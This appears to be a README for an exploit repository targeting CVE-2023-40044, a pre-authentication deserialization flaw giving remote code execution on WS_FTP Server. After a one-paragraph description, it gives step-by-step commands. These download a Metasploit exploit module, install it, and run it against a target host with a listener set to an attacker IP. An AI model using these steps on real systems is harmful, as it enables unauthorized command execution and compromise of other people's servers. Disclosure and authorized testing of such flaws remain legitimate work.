# CVE-2023-40044

![](https://img.shields.io/static/v1?label=Product&message=Progress%20Software&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=prior%20to%208.7.4%20and%208.8.2&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:9.8.%20Remote%20Code%20Execution&color=red)

## Description

In WS_FTP Server versions prior to 8.7.4 and 8.8.2, a pre-authenticated attacker could leverage a .NET deserialization vulnerability in the Ad Hoc Transfer module to execute remote commands on the underlying WS_FTP Server operating system.   

### Usage

### Metasploit Framework
```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2023/Progress_Software_WS_FTP_RCE/ws_ftp_rce_cve_2023_40044.rb
```
```
cp ws_ftp_rce_cve_2023_40044.rb /usr/share/metasploit-framework/modules/exploits/windows/http/ws_ftp_rce_cve_2023_40044.rb
```
```
msfdb reinit; msfconsole -q
```
```
use exploits//windows/http/ws_ftp_rce_cve_2023_40044.rb
```
```
set RHOSTS target_IP
```
```
set lhost attacker_IP
```
```
run
```

